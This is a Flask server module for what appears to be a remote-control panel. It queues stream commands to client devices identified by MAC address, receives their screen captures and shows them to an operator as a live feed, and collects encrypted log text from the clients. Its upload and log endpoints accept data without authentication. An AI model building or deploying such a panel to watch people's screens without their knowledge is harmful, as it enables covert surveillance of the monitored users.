from flask import Blueprint, request, render_template_string, session, redirect, url_for, send_from_directory, jsonify, Response
from datetime import datetime
import os, time, json, threading
from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE, decrypt_data

bp = Blueprint('screen', __name__)

@bp.route('/api/stream/start/<mac>', methods=['POST'])
def api_stream_start(mac):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    if mac in clients_db:
        clients_db[mac]['stream_active'] = True

        res = request.args.get('res', '1280')
        q = request.args.get('q', '30')

        upload_url = f"{request.host_url.rstrip('/')}/api/stream/upload/{mac}?res={res}&q={q}"
        cmd = f"F_CMD:STREAM:{upload_url}"
        clients_db[mac]['pending_file_cmd'] = cmd
        save_db()
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"})

@bp.route('/screen/<mac>')
def screen_page(mac):
    if not session.get('logged_in'): return redirect(url_for('auth.login'))
    if mac not in clients_db: return "设备不存在"

    SCREEN_HTML = """
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>屏幕监控 - {{ info.name }} ({{ mac }})</title>
        <style>
            body { background: #f0f2f5; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; padding: 10px; margin: 0; text-align: center; }
            .header { border-bottom: 2px solid #ddd; padding-bottom: 10px; margin-bottom: 10px; display: flex; flex-direction: column; text-align: left; }
            .header a { color: #007bff; text-decoration: none; margin-top: 5px; }
            .btn { background: #007bff; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-size: 16px; margin: 5px; max-width: 100%; }
            .btn:hover { background: #0056b3; }
            .btn:disabled { background: #ccc; cursor: not-allowed; }
            .btn-danger { background: #dc3545; }
            .btn-danger:hover { background: #c82333; }
            img { width: 100%; height: auto; max-width: 100%; border: 1px solid #ccc; box-shadow: 0 4px 8px rgba(0,0,0,0.1); margin-top: 10px; background: #000; object-fit: contain; }
        </style>
    </head>
    <body onunload="stopStream()">
        <div class="header">
            <span>📺 屏幕监控 - {{ info.name }} [{{ mac }}] (支持30FPS流畅串流)</span>
            <a href="/">[ 返回设备列表 ]</a>
        </div>
        <div>
            显示分标率阈值:
            <select id="resSelect">
                <option value="600">600p (很流畅)</option>
                <option value="800">800p (建议)</option>
                <option value="1280" selected>1280p (默认折中)</option>
                <option value="1920">1080p (卡顿原画)</option>
            </select>
            画质:
            <select id="qualitySelect">
                <option value="10">10% (极速狗牙)</option>
                <option value="20">20% (极速轻度模糊)</option>
                <option value="30" selected>30% (默认)</option>
                <option value="60">60% (高清)</option>
                <option value="100">100% (原图幻灯片)</option>
            </select>
            <button id="startBtn" class="btn" onclick="startStream()">▶️ 开始流畅串流</button>
            <button id="stopBtn" class="btn btn-danger" onclick="stopStream()" disabled>⏹️ 停止串流</button>
            <br>
            <span id="statusText" style="color: #666; font-size: 14px;">点击“开始流畅串流”获取连续自适应视频流...</span>
            <span id="fpsText" style="color: #d00; font-weight: bold; margin-left: 15px; font-size: 16px;"></span>
        </div>
        <img id="streamImg" src="" alt="等待串流..." style="display: none;">

        <script>
            let fpsInterval = null;
            let currentStreamSrc = '';

            function startStream() {
                var btnStart = document.getElementById('startBtn');
                var btnStop = document.getElementById('stopBtn');
                var st = document.getElementById('statusText');
                var res = document.getElementById('resSelect').value;
                var qual = document.getElementById('qualitySelect').value;

                btnStart.disabled = true;
                btnStop.disabled = false;
                st.innerText = "⏳ 正在通知受控端拉起流媒体进进程... 请稍候...";

                fetch('/api/stream/start/{{ mac }}?res=' + res + '&q=' + qual, { method: 'POST' })
                .then(r => r.json())
                .then(data => {
                    if (data.status === 'ok') {
                        st.innerText = "✅ 信令已下发，正在接收端缓冲...";
                        var img = document.getElementById('streamImg');
                        img.style.display = 'inline-block';
                        setTimeout(() => {
                            img.src = '/stream_video/{{ mac }}?t=' + Date.now();
                            st.innerText = "📺 串流进行中";
                            fpsInterval = setInterval(pollFps, 1000);
                        }, 1000);
                    } else {
                        st.innerText = "❌ 信令发送失败!";
                        btnStart.disabled = false;
                        btnStop.disabled = true;
                    }
                }).catch(e => {
                    st.innerText = "❌ 网络错误: " + e;
                    btnStart.disabled = false;
                    btnStop.disabled = true;
                });
            }

            function stopStream() {
                document.getElementById('startBtn').disabled = false;
                document.getElementById('stopBtn').disabled = true;
                document.getElementById('statusText').innerText = "⏹️ 串流已停止";
                document.getElementById('streamImg').style.display = 'none';
                document.getElementById('streamImg').src = "";
                document.getElementById('fpsText').innerText = "";
                if(fpsInterval) clearInterval(fpsInterval);

                fetch('/api/stream/stop/{{ mac }}', { method: 'POST', keepalive: true });
            }

            function pollFps() {
                fetch('/api/stream/fps/{{ mac }}')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('fpsText').innerText = "FPS: " + data.fps;
                });
            }
        </script>
    </body>
    </html>
    """
    return render_template_string(SCREEN_HTML, mac=mac, info=clients_db[mac])

@bp.route('/api/stream/stop/<mac>', methods=['POST'])
def api_stream_stop(mac):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    if mac in clients_db:
        clients_db[mac]['stream_active'] = False
        save_db()
    return jsonify({"status": "ok"})

@bp.route('/api/stream/upload/<mac>', methods=['POST'])
def stream_upload(mac):
    try:
        if mac in clients_db:
            frame_data = request.data
            if not clients_db[mac].get('stream_active', False):
                return "STOP", 200

            if frame_data:
                clients_db[mac]['stream_frame'] = frame_data

                now = time.time()
                if 'stream_fps_start' not in clients_db[mac] or now - clients_db[mac].get('stream_fps_start', now) > 2.0:
                    clients_db[mac]['stream_fps_start'] = now
                    clients_db[mac]['stream_frames'] = 0

                clients_db[mac]['stream_frames'] += 1
                elapsed = now - clients_db[mac]['stream_fps_start']
                if elapsed >= 1.0:
                    clients_db[mac]['stream_fps'] = clients_db[mac]['stream_frames'] / elapsed
                    clients_db[mac]['stream_fps_start'] = now
                    clients_db[mac]['stream_frames'] = 0

            return "OK", 200
    except Exception as e:
        print("Stream exception:", e)
    return "OK", 200

@bp.route('/api/stream/fps/<mac>')
def api_stream_fps(mac):
    if not session.get('logged_in'): return jsonify({"fps": 0})
    if mac in clients_db:
        return jsonify({"fps": round(clients_db[mac].get('stream_fps', 0), 1)})
    return jsonify({"fps": 0})

from flask import Response
def generate_mjpeg(mac):
    yield b'--frame\r\n'
    last_frame = b''
    while clients_db.get(mac, {}).get('stream_active', False):
        frame = clients_db.get(mac, {}).get('stream_frame', b'')
        if frame and frame != last_frame:
            last_frame = frame
            yield (b'Content-Type: image/jpeg\r\n'
                   b'Content-Length: ' + str(len(frame)).encode() + b'\r\n\r\n' +
                   frame + b'\r\n--frame\r\n')
        else:
            time.sleep(0.01)

@bp.route('/stream_video/<mac>')
def stream_video(mac):
    if not session.get('logged_in'): return "未登录", 403
    if mac in clients_db:
        clients_db[mac]['stream_active'] = True
        save_db()
        return Response(generate_mjpeg(mac), mimetype='multipart/x-mixed-replace; boundary=frame')
    return "Error", 404

@bp.route('/api/screen/log', methods=['POST'])
def screen_log_endpoint():
    mac = decrypt_data(request.form.get('mac', ''))
    log_msg = decrypt_data(request.form.get('log', ''))
    if mac in clients_db and log_msg:
        import urllib.parse
        log_msg = urllib.parse.unquote(log_msg)
        clients_db[mac]['screen_log'] = clients_db[mac].get('screen_log', '') + log_msg + '\n'
        save_db()
    return "OK", 200


